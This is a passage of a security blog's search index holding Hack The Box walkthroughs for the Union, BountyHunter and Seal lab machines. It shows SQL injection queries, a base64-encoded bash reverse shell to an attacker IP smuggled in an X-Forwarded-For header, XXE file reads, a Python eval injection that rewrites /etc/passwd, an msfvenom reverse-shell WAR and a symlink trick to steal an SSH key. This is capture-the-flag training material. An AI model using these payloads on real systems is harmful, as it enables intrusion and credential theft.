charset=UTF-8). | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 9.12 seconds  This machine has port 80 (HTTP) open.\nEnumeration If we go to http://10.10.11.128 we will see a page like this:\nWe can try to enter a player name and see that the name is available to compete in the tournament:\nThen, we can click on \u0026ldquo;here\u0026rdquo; to enter a flag in the following site:\nBut we have not got any valid flag.\nWe see that the website is built with PHP. Let\u0026rsquo;s apply fuzzing with ffuf adding PHP extensions:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.128/FUZZ -e .php index.php [Status: 200, Size: 1220, Words: 158, Lines: 43] css [Status: 301, Size: 178, Words: 6, Lines: 8] firewall.php [Status: 200, Size: 13, Words: 2, Lines: 1] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] challenge.php [Status: 200, Size: 772, Words: 48, Lines: 21]  Foothold There are some interesting files that will be useful in the future.\nFinding SQL injection The player field is vulnerable to Union-based SQL injection (the name of the machine is actually a hint). To test it, we can use curl from the command line interface:\n$ curl 10.10.11.128/index.php -d 'player=asdf' Congratulations asdf you may compete in this tournament!\nComplete the challenge \u0026lt;a href=\"/challenge.php\"\u0026gt;here\u0026lt;/a\u0026gt; $ curl 10.10.11.128/index.php -d \"player=asdf'\" Congratulations asdf' you may compete in this tournament!\nComplete the challenge \u0026lt;a href=\"/challenge.php\"\u0026gt;here\u0026lt;/a\u0026gt; $ curl 10.10.11.128/index.php -d \"player=asdf'-- -\" Congratulations asdf'-- - you may compete in this tournament!\nComplete the challenge \u0026lt;a href=\"/challenge.php\"\u0026gt;here\u0026lt;/a\u0026gt;  At first glance, it does not seem to be vulnerable. We can try to enter a UNION SELECT statement and then we will get a different result:\n$ curl 10.10.11.128/index.php -d \"player=' union select database() -- -\" Sorry, november you are not eligible due to already qualifying. $ curl 10.10.11.128/index.php -d \"player=' union select version() -- -\" Sorry, 8.0.27-0ubuntu0.20.04.1 you are not eligible due to already qualifying. $ curl 10.10.11.128/index.php -d \"player=' union select user() -- -\" Sorry, uhc@localhost you are not eligible due to already qualifying.  At this point, we can create a program to facilitate the extraction of data using SQL injection. This time, I used a Java program called UnionSQLi.java that creates an interactive session to enter SQL queries and outputs only the result of the query (detailed explanation here).\nCapturing the flag With this program, we can easily capture the needed flag:\n$ rlwrap java UnionSQLi.java SQLi\u0026gt; select database() november SQLi\u0026gt; select group_concat(table_name) from information_schema.tables where table_schema = 'november' flag,players SQLi\u0026gt; select group_concat(column_name) from information_schema.columns where table_name = 'flag' one SQLi\u0026gt; select one from flag UHC{F1rst_5tep_2_Qualify}  We can enter the flag in the website, and obtain the following response:\nNow, port 22 (SSH) is enabled for our IP address:\n$ nmap 10.10.11.128 -p 22 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 10.10.11.128 Host is up (0.051s latency). PORT STATE SERVICE 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds  Accessing via SSH However, we don\u0026rsquo;t know the user and the password to login through SSH.\nUsing SQLi, we can try to read files from the server. Let\u0026rsquo;s see if we can find credentials in config.php:\n$ rlwrap java UnionSQLi.java SQLi\u0026gt; select load_file('/var/www/html/config.php')  \u0026lt;?php session_start(); $servername =\"127.0.0.1\"; $username =\"uhc\"; $password =\"uhc-11qual-global-pw\"; $dbname =\"november\"; $conn =newmysqli($servername, $username, $password, $dbname); ?\u0026gt;  Now that we have credentials for MySQL, we can try to reuse them for SSH, and they work:\n$ ssh uhc@10.10.11.128 uhc@10.10.11.128's password: uhc@union:~$ cat user.txt 5875c4d16efbe9165548f9a5157e61ab  Having captured the user.txt flag, we can enumerate the system. There is nothing more to do as uhc.\nLateral movement to user www-data We can continue reading source code from SQLi, or from the SSH session.\nFinding a command injection Looking at firewall.php we can check how the iptables rule was applied to enable SSH to a certain IP address:\nuhc@union:~$ cd /var/www/html uhc@union:/var/www/html$ cat firewall.php  \u0026lt;?php require('config.php'); if(!($_SESSION['Authenticated'])) { echo\"Access Denied\"; exit; } ?\u0026gt; \u0026lt;linkhref=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\"rel=\"stylesheet\"id=\"bootstrap-css\"\u0026gt; \u0026lt;scriptsrc=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;scriptsrc=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!------ Include the above in your HEAD tag ----------\u0026gt; \u0026lt;divclass=\"container\"\u0026gt; \u0026lt;h1class=\"text-center m-5\"\u0026gt;Join the UHC - November Qualifiers\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;sectionclass=\"bg-dark text-center p-5 mt-4\"\u0026gt; \u0026lt;divclass=\"container p-5\"\u0026gt; \u0026lt;?php if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip =$_SERVER['HTTP_X_FORWARDED_FOR']; } else{ $ip =$_SERVER['REMOTE_ADDR']; }; system(\"sudo /usr/sbin/iptables -A INPUT -s \".$ip .\" -j ACCEPT\"); ?\u0026gt; \u0026lt;h1class=\"text-white\"\u0026gt;Welcome Back!\u0026lt;/h1\u0026gt; \u0026lt;h3class=\"text-white\"\u0026gt;Your IP Address has now been granted SSH Access.\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt;  We see that it is using a system command with sudo. The user that executes the server is www-data, hence this user must have sudo permissions.\nThe same line is vulnerable to command injection, since the variable $ip is being concatenated to the system command. We can have control of the variable if we include an HTTP request header called X-Forwarded-For.\nUsing a ;, adding the command and then putting another ; or a comment (#) is enough to exploit the vulnerability. Let\u0026rsquo;s go directly and enter a reverse shell command encoded in Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Take into account that we need to use a valid cookie to tell the server that we are authenticated:\n$ curl 10.10.11.128/firewall.php -H 'X-Forwarded-For: ; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash #' -H 'Cookie: PHPSESSID=57ti1m6fcai85k3mddqamripr0'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.128. Ncat: Connection from 10.10.11.128:33092. bash: cannot set terminal process group (801): Inappropriate ioctl for device bash: no job control in this shell www-data@union:~/html$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@union:~/html$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@union:~/html$ export TERM=xterm www-data@union:~/html$ export SHELL=bash www-data@union:~/html$ stty rows 50 columns 158  Privilege escalation As shown below, the user www-data is able to run any command as root using sudo and without password:\nwww-data@union:~/html$ sudo -l Matching Defaults entries for www-data on union: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on union: (ALL : ALL) NOPASSWD: ALL  So the privilege escalation is easy:\nwww-data@union:~/html$ sudo su root@union:~# cat /root/root.txt b044d40cc077970a99f680d1e82211b6  ","image":"/images/HTB/Union/Union.png","permalink":"https://7rocky.github.io/en/htb/union/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine contains Union-based SQL injection (SQLi) and command injection vulnerabilities. Some SQLi bypassing techniques and source code analysis skills are needed to compromise this machine. This write-up uses a custom Java program to automate a SQLi attack","time":6,"title":"Union"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.100   Release: 24 / 07 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.100 -p 22,80 Nmap scan report for 10.10.11.100 Host is up (0.036s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 8.17 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration If we access the website on port 80, we will see something like this:\nIf we go to \u0026ldquo;PORTAL\u0026rdquo;, we are redirected to this page:\nAnd clicking in \u0026ldquo;here\u0026rdquo;, we go to a development portal to create a kind of bug bounty report:\nIf we fill the data and submit the form, the server responds with the same data and it is rendered in the website:\nWe can make use of gobuster to fuzz for directories:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -q /resources (Status: 301) [Size: 316] [--\u0026gt; http://10.10.11.100/resources/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.100/assets/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.100/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.100/js/] /server-status (Status: 403) [Size: 276]  There are some interesting files in the /resources directory (because there is a directory listing vulnerability):\nHere we can read some tasks for the developer, nothing interesting for the moment:\nHowever, there is an interesting JavaScript file called bountylog.js:\n$ curl http://10.10.11.100/resources/bountylog.js  functionreturnSecret(data) { returnPromise.resolve( $.ajax({ type: \"POST\", data: { \"data\": data}, url: \"tracker_diRbPr00f314.php\" }) ); } asyncfunctionbountySubmit() { try{ varxml=`\u0026lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;${$('#exploitTitle').val()}\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;${$('#cwe').val()}\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;${$('#cvss').val()}\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;${$('#reward').val()}\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt;` letdata=awaitreturnSecret(btoa(xml)); $(\"#return\").html(data) } catch(error) { console.log('Error:', error); } }  These functions are executed when submitting the previous form. It is sending the data to tracker_diRbPr00f314.php as an XML document. This is telling us clearly that the attack vector is performing an XML External Entity injection (XXE).\nFoothold If the server is vulnerable to XXE, then we are able to read files from the server if we know the full path to the file.\nExploiting an XXE To exploit XXE, we can write a Bash script called xxe.sh to automate the process and extract the desired data (detailed explanation here). The idea is to load files from the server as follows:\n$ bash xxe.sh /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  To read the PHP source code, we have used a Base64 wrapper to encode the content and afterwards decode it. This way, we avoid bad characters for XML (such as \u0026lt; and \u0026gt;).\nWe can try some list of files to try when having an LFI, but none are useful. It seems that there must be some sensitive information in the PHP source code, but there is nothing interesting in the ones we know from the website (index.php, portal.php, log_submit.php and tracker_diRbPr00f314.php, all of them from /var/www/html).\nFinding a password At this point, we can recall that there was a task in the README.txt that talked about a database. After some tries, we see that db.php is found in the server.\nIf we were not able to figure out the filename, we can try fuzzing it in Bash as follows:\n$ for f in $(cat $WORDLISTS/dirbuster/directory-list-2.3-medium.txt); do bash xxe.sh /var/www/html/$f.php | grep -v 'Nothing found' \u0026/dev/null \u0026\u0026 echo Found: /var/www/html/$f.php; done Found: /var/www/html/index.php Found: /var/www/html/portal.php Found: /var/www/html/db.php  And yet another alternative is to return to the gobuster command and add a PHP extension:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -q -x php /index.php (Status: 200) [Size: 25169] /resources (Status: 301) [Size: 316] [--\u0026gt; http://10.10.11.100/resources/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.100/assets/] /portal.php (Status: 200) [Size: 125] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.100/css/] /db.php (Status: 200) [Size: 0] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.100/js/] /server-status (Status: 403) [Size: 276]  If we use the previous Bash script to read the db.php file, we see a password:\n$ bash xxe.sh /var/www/html/db.php  \u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver =\"localhost\"; $dbname =\"bounty\"; $dbusername =\"admin\"; $dbpassword =\"m19RoAU0hP41A1sTsq6K\"; $testuser =\"test\"; ?\u0026gt;  This password can be used to login via SSH as user development. We know that this user exists because it is listed in /etc/passwd:\n$ bash xxe.sh /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash development:x:1000:1000:Development:/home/development:/bin/bash  And now, we can get the user.txt flag:\n$ ssh development@10.10.11.100 development@10.10.11.100's password: development@bountyhunter:~$ cat user.txt 40b17284532347c9d5a94488e640f2b3  System enumeration User development is able to execute a Python script as root using sudo:\ndevelopment@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py  There is a file called contract.txt in the home directory. The file tells a little story to end with some reasons for having sudo permissions on the Python script:\ndevelopment@bountyhunter:~$ ls -a . .bash_history .bashrc contract.txt .local .ssh .viminfo .. .bash_logout .cache .lesshst .profile user.txt development@bountyhunter:~$ cat contract.txt Hey team, I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed. This has been our first job since the \"rm -rf\" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why. I set up the permissions for you to test this. Good luck. -- John  The Python script is shown below:\n#Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. defload_file(loc): ifloc.endswith(\".md\"): returnopen(loc, 'r') else: print(\"Wrong file type.\") exit() defevaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line=None fori, xinenumerate(ticketFile.readlines()): ifi==0: ifnotx.startswith(\"# Skytrain Inc\"): returnFalse continue ifi==1: ifnotx.startswith(\"## Ticket to \"): returnFalse print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue ifx.startswith(\"__Ticket Code:__\"): code_line=i+1 continue ifcode_lineandi==code_line: ifnotx.startswith(\"**\"): returnFalse ticketCode=x.replace(\"**\", \"\").split(\"+\")[0] ifint(ticketCode) %7==4: validationNumber=eval(x.replace(\"**\", \"\")) ifvalidationNumber\u0026gt;100: returnTrue else: returnFalse returnFalse defmain(): fileName=input(\"Please enter the path to the ticket file.\\n\") ticket=load_file(fileName) #DEBUG print(ticket) result=evaluate(ticket) if(result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.close main()  Privilege escalation The code smell of this script is the use of the eval() function, which is an unsafe function and is not recommended. With this function, we can get arbitrary code execution as root (because we have sudo permissions) performing a command injection in Python language.\nIn this situation, there are a lot of alternatives to gain access as root. This time, we will be modifying the password for the root user in /etc/passwd. For example, we can use the following password and encrypt it with openssl (DES Unix format):\n$ openssl passwd rocky JyHhfPjiAYUB2  We can make use of the open() built-in function to read files and write into them as root. The idea is to enter the password in /etc/passwd for the root user. Just as follows:\n- root:x:0:0:root:/root:/bin/bash + root:JyHhfPjiAYUB2:0:0:root:/root:/bin/bash  Taking a look at the code, it is reading from a MarkDown file (ticket) and doing some validations. The first is:\nfori, xinenumerate(ticketFile.readlines()): ifi==0: ifnotx.startswith(\"# Skytrain Inc\"): returnFalse continue  So the first line must be # Skytrain Inc. There is another validation:\nifi==1: ifnotx.startswith(\"## Ticket to \"): returnFalse print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue  The program expects a specific second line, so the file must have ## Ticket to  as second line.\nAnd then, to be able to enter Python code, we need to add another line, because there is another validation:\nifx.startswith(\"__Ticket Code:__\"): code_line=i+1 continue ifcode_lineandi==code_line: ifnotx.startswith(\"**\"): returnFalse ticketCode=x.replace(\"**\", \"\").split(\"+\")[0] ifint(ticketCode) %7==4: validationNumber=eval(x.replace(\"**\", \"\")) ifvalidationNumber\u0026gt;100: returnTrue else: returnFalse returnFalse  As it is shown, another required line is __Ticket Code:__.\nAnd finally, the ticketCode variable must be a number that has a remainder of 4 when it is divided by 7 (for example: 4, 11, 18 or -3). This ticketCode must be followed by a + sign and then the code that will go directly to eval().\nNow we need to create a valid ticket.md in order to execute code with the eval() function. A possible one is:\n# Skytrain Inc ## Ticket to 7Rocky __Ticket Code:__ **4+open('/etc/passwd', 'w').write('root:JyHhfPjiAYUB2' + open('/tmp/passwd').read()[6:])**  The injected Python code is:\nopen('/etc/passwd', 'w').write('root:JyHhfPjiAYUB2'+open('/tmp/passwd').read()[6:])  To make this code work, we need to backup the /etc/passwd file to /tmp/passwd. The use [6:] is to get all the content of the /tmp/passwd except for the first 6 characters, which corresponds exactly to root:x.\ndevelopment@bountyhunter:~$ cp /etc/passwd /tmp/passwd development@bountyhunter:~$ head -1 /tmp/passwd root:x:0:0:root:/root:/bin/bash development@bountyhunter:~$ head -1 /etc/passwd root:x:0:0:root:/root:/bin/bash  Now we execute the script and specify the ticket.md file where it is located. As shown, the root password has changed:\ndevelopment@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. ticket.md Destination: 7Rocky Valid ticket. development@bountyhunter:~$ head -1 /etc/passwd root:JyHhfPjiAYUB2:0:0:root:/root:/bin/bash  Now we can login as root because we have the password:\ndevelopment@bountyhunter:~$ su root Password: root@bountyhunter:/home/development# cat /root/root.txt 5d5a6aae768dd80352e1cefa556aac3f  ","image":"/images/HTB/BountyHunter/BountyHunter.png","permalink":"https://7rocky.github.io/en/htb/bountyhunter/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to XML External Entity (XXE) injection and that has sudo permissions configured. Some knowledge about XXE, PHP and Python is needed to compromise this machine. This write-up uses a custom Bash script to read files from the server exploiting XXE","time":8,"title":"BountyHunter"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.10.250   Release: 10 / 07 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.250 -p 22,443,8080 Nmap scan report for 10.10.10.250 Host is up (0.032s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA) | 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA) |_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Seal Market | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK | Not valid before: 2021-05-05T10:24:03 |_Not valid after: 2022-05-05T10:24:03 | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized | Date: Sun, 11 Jul 2021 20:12:53 GMT | Set-Cookie: JSESSIONID=node06lh8n576egh211y0xv2rr2r3i2.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 ... | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-title: Site doesn\u0026#39;t have a title (text/html;charset=utf-8). ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 17.11 seconds This machine has ports 22 (SSH), 443 (HTTPS) and 8080 (HTTP) open.\nExploring a Git repository in GitBucket The machine has a GitBucket on port 8080:\nTo enter, we can create an account. After that, we need to login and we will se two repositories: root/seal_market and root/infra:\nWe can find some hints in the README.md file of root/seal_market related to Tomcat configuration:\nFurthermore, there are some issues in the same repository talking about mutual authentication between nginx and Tomcat:\nIt is well-known that Tomcat handles autentication and authorization using a file called tomcat-users.xml (which is part of Tomcat comfiguration). The repository contains this file, but the current version does not include any sensitive information (maybe it has been updated because it was a task in the README.md):\nHowever, there is a previous commit that contains a password. We can see this old version using the \u0026ldquo;History\u0026rdquo; button:\nWe can also view this old commit using the git command-line interface. For that, we need to clone the repository using the previously registered account:\n$ git clone http://10.10.10.250:8080/git/root/seal_market.git Then, using git log we can see all the commits related to file tomcat-users.xml. Using some shell scripting we can filter the password:\n$ git log -p tomcat/tomcat-users.xml | grep manager | grep password -\u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;42MrHBf*z8{Z%\u0026#34; roles=\u0026#34;manager-gui,admin-gui\u0026#34;/\u0026gt; +\u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;42MrHBf*z8{Z%\u0026#34; roles=\u0026#34;manager-gui,admin-gui\u0026#34;/\u0026gt; This password curiously works to login as luis in GitBucket, but there is nothing to do there as luis.\nFinding web server misconfigurations On port 443 we can see a website like this:\nIf we trigger a 404 Not Found error, we see that the server is running Apache Tomcat/9.0.31:\nThere are some weird configurations in the web servers, because they are using both Tomcat and nginx at the same time. The nginx server was reported by nmap, and we also saw some clues on GitBucket. The same applies to Tomcat.\nThis can cause issues as nginx will normalize paths like /../ to / but will not change paths like /..;/. However, Tomcat will convert /..;/ to /../, making possible to perform a Directory Path Traversal (more information here):\nWith this vulnerability and the password found on GitBucket, we are able to enter /manager/html from /manager/status/..;/html and access the administration panel.\nFoothold on the machine Now, we are able to upload a malicious WAR file from /manager/status/..;/html, using msfvenom:\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f war -o reverse.war Payload size: 1091 bytes Final size of war file: 1091 bytes Saved as: reverse.war Nevertheless, when doing the POST request, it has to be done again changing the URL to /manager/status/..;/html/uploads (because we are not allowed to use /manager/html/uploads directly) as shown in Burp Suite:\nUsing Burp Suite, we can change the URL before sending the actual request:\nWe can check that the WAR has been uploaded successfully going again to /manager/status/..;/html:\nThen, using nc we get access to the machine as user tomcat when loading /reverse from he Tomcat manager panel:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.250. Ncat: Connection from 10.10.10.250:48774. script /dev/null -c bash Script started, file is /dev/null tomcat@seal:/var/lib/tomcat9$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm tomcat@seal:/var/lib/tomcat9$ export TERM=xterm tomcat@seal:/var/lib/tomcat9$ export SHELL=bash tomcat@seal:/var/lib/tomcat9$ stty rows 50 columns 158 Lateral movement to user luis We can see that there is a user called luis by reading /etc/passwd:\ntomcat@seal:/var/lib/tomcat9$ grep \u0026#39;sh$\u0026#39; /etc/passwd root:x:0:0:root:/root:/bin/bash luis:x:1000:1000:,,,:/home/luis:/bin/bash tomcat@seal:/var/lib/tomcat9$ ls -la /home/luis total 51324 drwxr-xr-x 9 luis luis 4096 Oct 25 19:51 . drwxr-xr-x 3 root root 4096 May 5 12:52 .. drwxrwxr-x 3 luis luis 4096 May 7 06:00 .ansible lrwxrwxrwx 1 luis luis 9 May 5 12:57 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 luis luis 220 May 5 12:52 .bash_logout -rw-r--r-- 1 luis luis 3797 May 5 12:52 .bashrc drwxr-xr-x 3 luis luis 4096 May 7 07:00 .cache drwxrwxr-x 3 luis luis 4096 May 5 13:45 .config drwxrwxr-x 6 luis luis 4096 Oct 25 19:19 .gitbucket -rw-r--r-- 1 luis luis 52497951 Jan 14 2021 gitbucket.war drwxrwxr-x 3 luis luis 4096 May 5 13:41 .java drwxrwxr-x 3 luis luis 4096 May 5 14:33 .local -rw-r--r-- 1 luis luis 807 May 5 12:52 .profile drwx------ 2 luis luis 4096 May 7 06:10 .ssh -r-------- 1 luis luis 33 Oct 25 19:19 user.txt Searching for files belonging to user luis, we find that there is an Ansible Playbook to backup a part of the Tomcat webapp, which will be stored periodically at /opt/backups/archives:\ntomcat@seal:/var/lib/tomcat9$ find / -user luis 2\u0026gt;/dev/null | grep -vE \u0026#39;proc|/\\.\u0026#39; /opt/backups /opt/backups/archives /opt/backups/archives/backup-2021-07-15-15:50:33.gz /opt/backups/archives/backup-2021-07-15-15:53:32.gz /opt/backups/archives/backup-2021-07-15-15:52:32.gz /opt/backups/archives/backup-2021-07-15-15:51:32.gz /opt/backups/playbook /opt/backups/playbook/run.yml /home/luis /home/luis/user.txt /home/luis/gitbucket.war tomcat@seal:/var/lib/tomcat9$ cat /opt/backups/playbook/run.yml - hosts: localhost  tasks:  - name: Copy Files  synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes   - name: Server Backups  archive:  path: /opt/backups/files/  dest: \u0026#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\u0026#34;  - name: Clean  file:  state: absent  path: /opt/backups/files/ Exploring the directory that is being backuped, we see that we have all permissions in the uploads directory:\ntomcat@seal:/var/lib/tomcat9$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard total 100 drwxr-xr-x 7 root root 4096 May 7 09:26 . drwxr-xr-x 3 root root 4096 May 6 10:48 .. drwxr-xr-x 5 root root 4096 Mar 7 2015 bootstrap drwxr-xr-x 2 root root 4096 Mar 7 2015 css drwxr-xr-x 4 root root 4096 Mar 7 2015 images -rw-r--r-- 1 root root 71744 May 6 10:42 index.html drwxr-xr-x 4 root root 4096 Mar 7 2015 scripts drwxrwxrwx 2 root root 4096 May 7 09:26 uploads tomcat@seal:/var/lib/tomcat9$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads total 8 drwxrwxrwx 2 root root 4096 May 7 09:26 . drwxr-xr-x 7 root root 4096 May 7 09:26 .. To exploit this, we can create a symbolic link to the id_rsa of user luis into the uploads directory, so that it is backuped and compressed. Then we will be able to read it after decompressing the backup.\nSo, first we create the symbolic link:\ntomcat@seal:/var/lib/tomcat9$ ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/ tomcat@seal:/var/lib/tomcat9$ ls -la webapps/ROOT/admin/dashboard/uploads/ total 8 drwxrwxrwx 2 root root 4096 Oct 25 20:00 . drwxr-xr-x 7 root root 4096 May 7 09:26 .. 